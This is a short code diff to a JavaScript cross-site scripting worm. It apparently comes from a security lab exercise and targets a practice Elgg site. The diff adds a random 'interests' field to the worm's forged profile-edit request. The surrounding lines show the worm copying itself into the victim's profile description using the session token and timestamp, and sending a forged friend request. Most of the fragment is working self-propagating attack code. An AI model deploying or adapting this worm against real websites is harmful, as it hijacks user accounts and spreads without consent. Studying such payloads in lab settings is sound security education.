@@ -19,9 +19,11 @@ window.onload = function () {
 
     var description = "&description="+wormCode+"&accesslevel[description]=1";
     var briefdescription = "&briefdescription="+1605011+"&accesslevel[briefdescription]=1";
+    var interests = "&interests="+randomString(10)+"&accesslevel[interests]=1";
+
 
     var sendurlPOST = "http://www.xsslabelgg.com/action/profile/edit";
-    var editContent =  guid + ts + token + description + briefdescription;
+    var editContent =  guid + ts + token + description + briefdescription + interests;
 
     var sendurlGET = "http://www.xsslabelgg.com/action/friends/add?friend=47"+ts+token;
 
